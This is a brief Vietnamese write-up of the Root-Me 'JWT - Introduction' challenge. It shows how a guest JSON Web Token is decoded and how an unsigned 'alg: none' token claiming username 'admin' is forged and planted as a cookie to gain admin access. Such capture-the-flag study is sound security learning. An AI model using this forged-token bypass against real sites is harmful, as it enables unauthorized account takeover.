# JSON Web Token (JWT) - Introduction

[Link](http://challenge01.root-me.org/web-serveur/ch58/)

![1](image/1.png)

- Đề cho 1 form đăng nhập, cố login kiểu gì cũng không được

- Click vào link `Login as Guest!` xem sao

![2](image/2.png)

- Cũng không có gì đặc biệt cả, `F12` lên xem có gì hơn không

![3](image/3.png)

- Để ý thì thấy có đoạn cookie này hơi đặc biệt

```
jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk
```

- Kết hợp với đề cho thì đây là `JSON Web Token`

- Đọc thêm về `JSON Web Token`: [Link](https://jwt.io/)

- Phân tích đoạn cookie của `jwt` (decode base64) thì ta được:

```
{"typ":"JWT","alg":"HS256"}.{"username":"guest"}
```

- Theo lý thuyết thì rất khó có thể suy ra `key secret` trong trường hợp này

- Thử đổi loại mã hóa thành *none* và **encode base64** xem sao

- Payload:

```
{"typ":"JWT","alg":"none"}.{"username":"admin"}
```

- Chuyển thành:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIn0=.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk
```

- Phần `VERIFY SIGNATURE` lấy đại của cookie cũng không ảnh hưởng gì lắm

- Giờ thì vào trình `edit cookie` để chỉnh thôi

![4](image/4.png)

![5](image/5.png)

- OK, thành công mỹ mãn
